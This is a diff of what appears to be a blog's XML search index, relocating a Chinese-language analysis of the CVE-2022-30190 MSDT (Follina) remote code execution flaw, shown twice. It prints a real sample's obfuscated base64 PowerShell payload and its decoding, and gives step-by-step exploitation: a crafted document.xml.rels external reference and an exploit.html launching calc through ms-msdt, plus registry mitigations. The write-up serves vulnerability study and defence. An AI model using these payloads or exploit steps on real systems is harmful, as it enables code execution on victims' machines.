@@ -1255,182 +1255,6 @@ SetWindowLongPtr(hTargetWnd, TAGWND_BODY_REL_VALUE_OFF, 0);
       </tags>
   </entry>
   <entry>
-    <title>CVE-2022-30190 MSDT远程代码注入漏洞分析</title>
-    <url>/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h4 id="WTP框架"><a href="#WTP框架" class="headerlink" title="WTP框架"></a>WTP框架</h4><p>windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。</p>
-<h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816150216855.png" alt="image-20220816150216855" style="zoom: 67%;">
-
-<ul>
-<li>WTP由两个进程组成，Process1是带UI的Troubleshooting Run-time Engine，Process2用于提供window PowerShell Runtime环境。</li>
-<li>Process2提供的PowerShell运行时环境提供了4条特殊的PowerShell命令：Get-DiagInput、Update-DiagReport、Update-DiagRootCause、Write-DiagProgress</li>
-<li>Troubleshooting Pack运行在Process1和Process2所构建的平台上。</li>
-</ul>
-<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ul>
-<li><p>故障排除包是用户可编程部分，本质上是一组针对特定故障的检测修复脚本。Process1(Troubleshooting Run-time Engine)通过故障排除包获取检测脚本检测问题，查出问题交给Process2(PowerShell)运行处理。</p>
-</li>
-<li><p>Process1是msdt.exe，Process2是sdiagnhost.exe</p>
-</li>
-<li><p>sdiagnhost.exe为了给msdt.exe提供运行脚本的能力，注册了IScriptedDiagnosticHost com接口，相应的com方法是RunScript()</p>
-</li>
-<li><p>故障排除包的设计基于三个步骤：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verificationg），对应TS、RS、VF三种脚本。</p>
-</li>
-</ul>
-<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>WTP提供了一系列默认故障排除包，可以在ms-msdt协议里通过-id参数指定。</p>
-<p>CVE-2022-30190使用PCWDiagnostic，用于程序兼容性故障排除。</p>
-<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可以利用Office文件中的远程模块功能，访问远程服务器上挂载的恶意HTML文件，之后通过ms-msdt URL来执行恶意powershell代码，漏洞在宏被禁用的情况下依然可以利用。</p>
-<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-30190本质上是PowerShell代码注入漏洞。MSDT和Powershell的C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1脚本交互，相关的IT_BrowseForFile参数存在命令注入，最终的调用PowerShell动态执行。</p>
-<p><strong>影响版本：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2008 SP2
-Microsoft Windows 11
-Microsoft Windows Server 2019
-Microsoft Windows 10 1607
-Microsoft Windows Server 20H2
-Microsoft Windows Server 2022
-Microsoft Windows Server 2016 (Server Core installation)
-Microsoft Windows Server 2016 null
-Microsoft Windows 10
-Microsoft Windows 10 1809
-Microsoft Windows Server 2008 R2 SP1
-Microsoft Windows Server 2022 (Server Core installation)
-Microsoft Windows Server 2019 (Server Core installation)
-Microsoft Windows 8.1
-Microsoft Windows 10 20H2
-Microsoft Windows 10 21H2
-Microsoft Windows Server 2012 R2
-Microsoft Windows 7 SP1
-Microsoft Windows RT 8.1 SP0
-Microsoft Windows Server 2012
-Microsoft Windows 10 21H1
-Microsoft Windows Server 2022 Azure Edition Core Hotpatch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>样本是docx文件，解压，其中/word/_rels目录下的document.xml.rels文件包含对<a href="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html%E7%9A%84%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E3%80%82">https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html的外部引用。</a></p>
-<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816163900629.png"></p>
-<p><strong>RDF842l.html原始内容：</strong></p>
-<p>使用了4个参数，IT_RebrowseForFile、IT_LaunchMethod、IT_SelectProgram、IT_BrowseForFile。利用IT_BrowseForFile参数加载了powershell脚本执行恶意功能。4096字节的A填充，是windows诊断工具的缓冲区大小。</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
-&lt;html lang="en"&gt;
-&lt;body&gt;
-&lt;script&gt;
-//AAAAAAAAAAAAAAAAAAAAAAAA
-//重复让整个html文件达到4096字节
-    window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+  [char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
-&lt;/script&gt;
-&lt;/body&gt;
-&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>首先使用window.location.href创建窗口，ms-msdt是windows诊断工具，之后调用powershell，执行的内容经过了base64加密</p>
-<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220817165023922.png"></p>
-<p>解密得到</p>
-<pre class="line-numbers language-none"><code class="language-none">$cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>启动隐藏窗口：</p>
-<pre class="line-numbers language-none"><code class="language-none">如果msdt.exe正在运行，终止它
-循环遍历RAR文件中的文件，查找编码CAB文件的Base64字符串
-将Base64字符串编码的cab文件保存1.c
-将1.c cab文件展开到当前目录
-最后执行rgb.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>因此window会无限制执行powershell.如果修改成想要执行的代码，就会导致远程代码执行漏洞。因此，只需修改xml文件，引用网站上的恶意代码就行。</p>
-<h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><p>在Microsoft.Windows.Diagnosis.SDHost.dll里的Microsoft.Windows.Diagnosis.ManagedHost.Run Script()方法实现了IScriptedDiagnosticHost com接口里的RunScript方法，用于给msdt.exe提供执行检测脚本所需要的PowerShell运行时环境，然后重新触发漏洞。RunScript()方法一共被触发了两次，第一次用于调用TS脚本，第二次用于调用RS脚本。</p>
-<p>要触发对RS_ProgramCompatibityWizard.ps1的调用，要先通过TS_ProgramCompatibilityWizard.ps1脚本的检测</p>
-<h4 id="TS-ProgramCompatibilityWizard-ps1"><a href="#TS-ProgramCompatibilityWizard-ps1" class="headerlink" title="TS_ProgramCompatibilityWizard.ps1"></a>TS_ProgramCompatibilityWizard.ps1</h4><p>Get-DiagInput用于从用户获取输入的信息，获取传入的IT_BrowseForFile参数，并赋值给$selectedProgram变量。</p>
-<pre class="line-numbers language-none"><code class="language-none">if(-not($ChoicesAvailable))
-{
-    $selectedProgram = Get-DiagInput -id IT_BrowseForFile
-}
-else
-{
-    $selectedProgram = Get-DiagInput -id IT_SelectProgram -choice $choices
-
-	## If the user chose the option "Not listed" we will ask them to browse for a file
-    if($selectedProgram -eq "NotListed")
-    {
-        $selectedProgram = Get-DiagInput -id IT_BrowseForFile
-    }
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>调用Test-Selection方法对$selectedProgram进行检测。使用test_path命令来对路径进行检测，确保路径存在，对于/../返回到根路径之外的路径返回True，要求路径的扩展名为exe和msi。</p>
-<pre class="line-numbers language-none"><code class="language-none">function Test-Selection([string]$appPath)
-{
-    $testresult = $false
-
-    if(($appPath -ne $null) -and -not([String]::IsNullOrEmpty($appPath)))
-    {
-        $testresult = test-path -literalpath $appPath
-
-        if($testresult)
-        {
-            if(-not($type::IsFileProtected($appPath)))
-            {
-                $extension = [System.IO.Path]::GetExtension($appPath)
-                $testresult = ($extension -eq ".exe") -or ($extension -eq ".msi")
-            }
-            else
-            {
-                $testresult = $false
-                Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_PROTECTED -scope global
-            }
-        }
-    }
-
-    Set-Variable -name appValid -value $testResult -scope global
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>从$selectedProgram提取文件名，过滤$符号，防止代码注入。由于脚本直接使用$,$实际会在过滤前被PowerShell引擎解析，所以无法起到过滤$字符的作用。</p>
-<p>正确写法应为 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(“`$”, “``$”)</p>
-<pre class="line-numbers language-none"><code class="language-none">while(-not($appValid))
-{
-    $InstanceId++
-    $selection = $selectedProgram
-    $selectedProgram = Get-DiagInput -id IT_RebrowseForFile -parameter @{ "SelectedProgram" = $selection; "RebrowseText" = $rebrowseText; "Instance" = $InstanceId }
-    Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_INVALID -scope global
-    Test-Selection($selectedProgram)
-}
-
-$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>TS最后使用Update-DiagRootCause命令，用于报告root cause的状态。会触发RS_脚本，parameter指定的字典会被作为参数传给脚本，导致第二次调用RunScript()方法，并且参数中-TargetPath可控，进而触发了漏洞。</p>
-<pre class="line-numbers language-none"><code class="language-none">if ($UpdateChoice -eq "ts_Manual")
-{
-    $Env:RecommendedLayer = $AppInfo[2]
-    Update-DiagRootCause -id "RC_IncompatibleApplication" -iid $appName -Detected $true -parameter @{ "TARGETPATH" = $selectedProgram; "APPNAME" = $appName}
-}
-else
-{
-    Start-Process -FilePath $AppInfo[1]
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>1.新建word文档，后缀更改为zip，打开后编辑/word/_regs目录下的document.xml.rels按照格式加入。</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;Relationship  Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObje ct" Target="mhtml:http://localhost:80/exploit.html!x-usc:http://localhost:80/exploit.html" TargetMode="External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>2.建一个文件夹作为web站点目录，新建exploit.html文件添加（弹计算器）</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;
-location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=?
-IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows\\system32\\calc)/.exe\"";
-&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>IT_RebrowseForFile参数开头至少需要两次/../目录遍历</p>
-<p>包含$()中的代码会通过PowerShell执行</p>
-<p>.exe必须是IT_BrowseForFile参数末尾的最后一个字符串</p>
-<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p><strong>缓解方法：</strong></p>
-<p>1.禁用MSDT URL协议阻止使用漏洞的恶意攻击。</p>
-<p>2.禁用MSDT URL协议可防止故障排除应用程序作为链接启动，包括整个操作系统的链接。</p>
-<p><strong>禁用方法：</strong></p>
-<p>1.以管理员身份运行命令提示符</p>
-<p>2.备份注册表项，执行命令<code>reg export HKEY_CLASSES_ROOT\ms-msdt [filename]</code></p>
-<p>3.执行命令<code>reg delete HKEY_CLASSES_ROOT\ms-msdt</code></p>
-<p><strong>撤销禁用：</strong></p>
-<p>1.以管理员身份运行命令提示符</p>
-<p>2.恢复注册表项，执行命令“reg import [filename]”</p>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2022-21882 Win32K本地提权分析</title>
     <url>/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="0x00漏洞描述"><a href="#0x00漏洞描述" class="headerlink" title="0x00漏洞描述"></a>0x00漏洞描述</h2><p>CVE-2022-21882漏洞是window系统的一个本地提权漏洞，微软在2022年1月份安全更新中修补了此漏洞。CVE-2022-21882是对CVE-2021-1732漏洞的绕过，属于win32k驱动程序中的类型混淆漏洞。漏洞成因与CVE-2021-1732类似，主要因为win32kfull!xxxClientAllocExtraBytes函数会回调用户空间中的user32!xxxClientAllocWindowClassExtraBytes,使用NtUserConsoleControl方法设置tagWNDK对象的ConsoleWindow标志，修改窗口类型。回调之后，系统不检查窗口类型是否改变，攻击者可以设置目标窗口的ExtraBytes指针为任意值，修改寻址方式为桌面堆+偏移，以实现桌面堆的越界写。</p>
@@ -2048,6 +1872,182 @@ int main(int argc,char *argv[]) {
 <p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173152485.png"></p>
 <p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173215705.png"></p>
 <p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173238270.png"></p>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2022-30190 MSDT远程代码注入漏洞分析</title>
+    <url>/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h4 id="WTP框架"><a href="#WTP框架" class="headerlink" title="WTP框架"></a>WTP框架</h4><p>windows疑难解答平台（WTP）为ISV、OEM和管理员提供了疑难解答包的过程，这些包用于发现和解决计算机上的问题。WTP框架提供自动化检测修复方式。</p>
+<h4 id="底层结构"><a href="#底层结构" class="headerlink" title="底层结构"></a>底层结构</h4><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816150216855.png" alt="image-20220816150216855" style="zoom: 67%;">
+
+<ul>
+<li>WTP由两个进程组成，Process1是带UI的Troubleshooting Run-time Engine，Process2用于提供window PowerShell Runtime环境。</li>
+<li>Process2提供的PowerShell运行时环境提供了4条特殊的PowerShell命令：Get-DiagInput、Update-DiagReport、Update-DiagRootCause、Write-DiagProgress</li>
+<li>Troubleshooting Pack运行在Process1和Process2所构建的平台上。</li>
+</ul>
+<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ul>
+<li><p>故障排除包是用户可编程部分，本质上是一组针对特定故障的检测修复脚本。Process1(Troubleshooting Run-time Engine)通过故障排除包获取检测脚本检测问题，查出问题交给Process2(PowerShell)运行处理。</p>
+</li>
+<li><p>Process1是msdt.exe，Process2是sdiagnhost.exe</p>
+</li>
+<li><p>sdiagnhost.exe为了给msdt.exe提供运行脚本的能力，注册了IScriptedDiagnosticHost com接口，相应的com方法是RunScript()</p>
+</li>
+<li><p>故障排除包的设计基于三个步骤：检测问题（troubleshooting）、解决问题（resolution）和验证解决方案（verificationg），对应TS、RS、VF三种脚本。</p>
+</li>
+</ul>
+<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>WTP提供了一系列默认故障排除包，可以在ms-msdt协议里通过-id参数指定。</p>
+<p>CVE-2022-30190使用PCWDiagnostic，用于程序兼容性故障排除。</p>
+<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可以利用Office文件中的远程模块功能，访问远程服务器上挂载的恶意HTML文件，之后通过ms-msdt URL来执行恶意powershell代码，漏洞在宏被禁用的情况下依然可以利用。</p>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-30190本质上是PowerShell代码注入漏洞。MSDT和Powershell的C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1脚本交互，相关的IT_BrowseForFile参数存在命令注入，最终的调用PowerShell动态执行。</p>
+<p><strong>影响版本：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">Microsoft Windows Server 2008 SP2
+Microsoft Windows 11
+Microsoft Windows Server 2019
+Microsoft Windows 10 1607
+Microsoft Windows Server 20H2
+Microsoft Windows Server 2022
+Microsoft Windows Server 2016 (Server Core installation)
+Microsoft Windows Server 2016 null
+Microsoft Windows 10
+Microsoft Windows 10 1809
+Microsoft Windows Server 2008 R2 SP1
+Microsoft Windows Server 2022 (Server Core installation)
+Microsoft Windows Server 2019 (Server Core installation)
+Microsoft Windows 8.1
+Microsoft Windows 10 20H2
+Microsoft Windows 10 21H2
+Microsoft Windows Server 2012 R2
+Microsoft Windows 7 SP1
+Microsoft Windows RT 8.1 SP0
+Microsoft Windows Server 2012
+Microsoft Windows 10 21H1
+Microsoft Windows Server 2022 Azure Edition Core Hotpatch <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h4><p>样本是docx文件，解压，其中/word/_rels目录下的document.xml.rels文件包含对<a href="https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html%E7%9A%84%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8%E3%80%82">https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html的外部引用。</a></p>
+<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220816163900629.png"></p>
+<p><strong>RDF842l.html原始内容：</strong></p>
+<p>使用了4个参数，IT_RebrowseForFile、IT_LaunchMethod、IT_SelectProgram、IT_BrowseForFile。利用IT_BrowseForFile参数加载了powershell脚本执行恶意功能。4096字节的A填充，是windows诊断工具的缓冲区大小。</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+&lt;body&gt;
+&lt;script&gt;
+//AAAAAAAAAAAAAAAAAAAAAAAA
+//重复让整个html文件达到4096字节
+    window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+  [char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先使用window.location.href创建窗口，ms-msdt是windows诊断工具，之后调用powershell，执行的内容经过了base64加密</p>
+<p><img src="/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220817165023922.png"></p>
+<p>解密得到</p>
+<pre class="line-numbers language-none"><code class="language-none">$cmd = "c:\windows\system32\cmd.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>启动隐藏窗口：</p>
+<pre class="line-numbers language-none"><code class="language-none">如果msdt.exe正在运行，终止它
+循环遍历RAR文件中的文件，查找编码CAB文件的Base64字符串
+将Base64字符串编码的cab文件保存1.c
+将1.c cab文件展开到当前目录
+最后执行rgb.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因此window会无限制执行powershell.如果修改成想要执行的代码，就会导致远程代码执行漏洞。因此，只需修改xml文件，引用网站上的恶意代码就行。</p>
+<h4 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h4><p>在Microsoft.Windows.Diagnosis.SDHost.dll里的Microsoft.Windows.Diagnosis.ManagedHost.Run Script()方法实现了IScriptedDiagnosticHost com接口里的RunScript方法，用于给msdt.exe提供执行检测脚本所需要的PowerShell运行时环境，然后重新触发漏洞。RunScript()方法一共被触发了两次，第一次用于调用TS脚本，第二次用于调用RS脚本。</p>
+<p>要触发对RS_ProgramCompatibityWizard.ps1的调用，要先通过TS_ProgramCompatibilityWizard.ps1脚本的检测</p>
+<h4 id="TS-ProgramCompatibilityWizard-ps1"><a href="#TS-ProgramCompatibilityWizard-ps1" class="headerlink" title="TS_ProgramCompatibilityWizard.ps1"></a>TS_ProgramCompatibilityWizard.ps1</h4><p>Get-DiagInput用于从用户获取输入的信息，获取传入的IT_BrowseForFile参数，并赋值给$selectedProgram变量。</p>
+<pre class="line-numbers language-none"><code class="language-none">if(-not($ChoicesAvailable))
+{
+    $selectedProgram = Get-DiagInput -id IT_BrowseForFile
+}
+else
+{
+    $selectedProgram = Get-DiagInput -id IT_SelectProgram -choice $choices
+
+	## If the user chose the option "Not listed" we will ask them to browse for a file
+    if($selectedProgram -eq "NotListed")
+    {
+        $selectedProgram = Get-DiagInput -id IT_BrowseForFile
+    }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>调用Test-Selection方法对$selectedProgram进行检测。使用test_path命令来对路径进行检测，确保路径存在，对于/../返回到根路径之外的路径返回True，要求路径的扩展名为exe和msi。</p>
+<pre class="line-numbers language-none"><code class="language-none">function Test-Selection([string]$appPath)
+{
+    $testresult = $false
+
+    if(($appPath -ne $null) -and -not([String]::IsNullOrEmpty($appPath)))
+    {
+        $testresult = test-path -literalpath $appPath
+
+        if($testresult)
+        {
+            if(-not($type::IsFileProtected($appPath)))
+            {
+                $extension = [System.IO.Path]::GetExtension($appPath)
+                $testresult = ($extension -eq ".exe") -or ($extension -eq ".msi")
+            }
+            else
+            {
+                $testresult = $false
+                Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_PROTECTED -scope global
+            }
+        }
+    }
+
+    Set-Variable -name appValid -value $testResult -scope global
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>从$selectedProgram提取文件名，过滤$符号，防止代码注入。由于脚本直接使用$,$实际会在过滤前被PowerShell引擎解析，所以无法起到过滤$字符的作用。</p>
+<p>正确写法应为 $appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace(“`$”, “``$”)</p>
+<pre class="line-numbers language-none"><code class="language-none">while(-not($appValid))
+{
+    $InstanceId++
+    $selection = $selectedProgram
+    $selectedProgram = Get-DiagInput -id IT_RebrowseForFile -parameter @{ "SelectedProgram" = $selection; "RebrowseText" = $rebrowseText; "Instance" = $InstanceId }
+    Set-Variable -name rebrowseText -value $CompatibilityStrings.Text_FILE_INVALID -scope global
+    Test-Selection($selectedProgram)
+}
+
+$appName = [System.IO.Path]::GetFileNameWithoutExtension($selectedProgram).Replace("$", "`$")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>TS最后使用Update-DiagRootCause命令，用于报告root cause的状态。会触发RS_脚本，parameter指定的字典会被作为参数传给脚本，导致第二次调用RunScript()方法，并且参数中-TargetPath可控，进而触发了漏洞。</p>
+<pre class="line-numbers language-none"><code class="language-none">if ($UpdateChoice -eq "ts_Manual")
+{
+    $Env:RecommendedLayer = $AppInfo[2]
+    Update-DiagRootCause -id "RC_IncompatibleApplication" -iid $appName -Detected $true -parameter @{ "TARGETPATH" = $selectedProgram; "APPNAME" = $appName}
+}
+else
+{
+    Start-Process -FilePath $AppInfo[1]
